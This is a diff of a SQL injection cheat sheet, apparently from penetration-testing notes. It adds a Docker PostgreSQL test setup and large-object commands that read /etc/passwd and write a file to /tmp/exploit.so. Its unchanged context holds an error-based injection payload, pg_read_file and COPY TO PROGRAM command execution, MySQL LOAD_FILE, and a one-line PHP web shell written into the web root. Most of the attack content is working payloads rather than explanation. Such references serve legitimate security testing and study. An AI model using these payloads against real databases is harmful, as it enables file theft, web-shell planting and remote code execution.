@@ -48,11 +48,21 @@ toc: true
 - [Oracle - Online](https://livesql.oracle.com/)
 - SQLite3: run the command `sqlite3` - [Docs](https://www.sqlite.org/docs.html)
 
+```bash
+$ sudo docker run -d --rm --name test-postgres -e POSTGRES_PASSWORD=s3cr3t -e PGDATA=/var/lib/postgresql/data/pgdata postgres:16.3-bookworm
+$ sudo docker exec -it test-postgres bash
+root@1d5aa23dac7c:/# psql -U postgres
+psql (16.3 (Debian 16.3-1.pgdg120+1))
+Type "help" for help.
+
+postgres=#
+```
+
 ## Database enumeration
 
 ### MySQL
 
-```
+```sql
 SELECT GROUP_CONCAT(schema_name,',') FROM information_schema.schemata;
 SELECT GROUP_CONCAT(table_name,',') FROM information_schema.tables;
 SELECT GROUP_CONCAT(column_name,',') FROM information_schema.columns WHERE table_name = 'users';
@@ -60,7 +70,7 @@ SELECT GROUP_CONCAT(column_name,',') FROM information_schema.columns WHERE table
 
 ### PostgreSQL
 
-```
+```sql
 SELECT datname FROM pg_database;
 SELECT string_agg(table_name,',') FROM information_schema.tables;
 SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name = 'users';
@@ -68,7 +78,7 @@ SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_n
 
 ### SQLite
 
-```
+```sql
 SELECT GROUP_CONCAT(tbl_name,',') FROM sqlite_master WHERE type='table' AND tbl_name NOT like 'sqlite_%';
 SELECT sql FROM sqlite_master WHERE tbl_name='users';
 SELECT GROUP_CONCAT(name,',') FROM PRAGMA_TABLE_INFO('users');
@@ -78,7 +88,7 @@ SELECT GROUP_CONCAT(name,',') FROM PRAGMA_TABLE_INFO('users');
 
 ### PostgreSQL
 
-```
+```sql
 ' AND 1=CAST((SELECT username FROM users) AS int)--
 ```
 
@@ -86,15 +96,25 @@ SELECT GROUP_CONCAT(name,',') FROM PRAGMA_TABLE_INFO('users');
 
 ### PostgreSQL
 
-```
+```sql
 SELECT pg_ls_dir('.');
 SELECT pg_read_file('/etc/passwd');
 COPY (SELECT '') TO PROGRAM 'sleep 5';
+
+SELECT lo_import('/etc/passwd', 31337);
+SELECT lo_get(31337);
+
+SELECT lo_from_bytea(131337, decode('SGVsbG8gV29ybGQh', 'base64'));
+SELECT lo_export(131337, '/tmp/exploit.so');
 ```
 
 ### MySQL
 
-```
+```sql
 SELECT LOAD_FILE('/etc/passwd');
 SELECT '<?php system($_REQUEST[c]); ?>' INTO OUTFILE '/var/www/html/shell.php';
 ```
+
+## References
+
+- [PostgreSQL SQL injection: SELECT only RCE - @adeadfed](https://adeadfed.com/posts/postgresql-select-only-rce/)
